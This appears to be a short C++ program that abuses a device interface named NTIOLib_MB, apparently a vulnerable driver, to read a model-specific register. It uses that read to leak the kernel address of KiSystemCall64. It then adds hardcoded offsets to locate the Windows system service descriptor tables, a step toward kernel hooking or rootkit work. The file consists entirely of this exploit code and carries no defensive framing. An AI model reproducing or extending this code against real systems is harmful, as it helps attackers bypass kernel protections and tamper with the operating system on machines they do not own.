#include <windows.h>
#include <iostream>
#include "ReadWrite.h"


int main() {


    HANDLE device = CreateFileW(L"\\\\.\\NTIOLib_MB", GENERIC_READ | GENERIC_WRITE, NULL, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

    PVOID KiSystemCall64;
    readMSR(device, 0xc0000082, (QWORD*)&KiSystemCall64); //0xc0000082
    printf("%llx\n", KiSystemCall64);


    PVOID KeServiceDescriptorTable = (BYTE*)KiSystemCall64 + 0x374 + 0x9f0b4c;
    PVOID KeServiceDescriptorTableShadow = (BYTE*)KiSystemCall64 + 0x37b + 0x8ebcc5;
     

    printf("%llx, %llx\n", KeServiceDescriptorTable, KeServiceDescriptorTableShadow);

}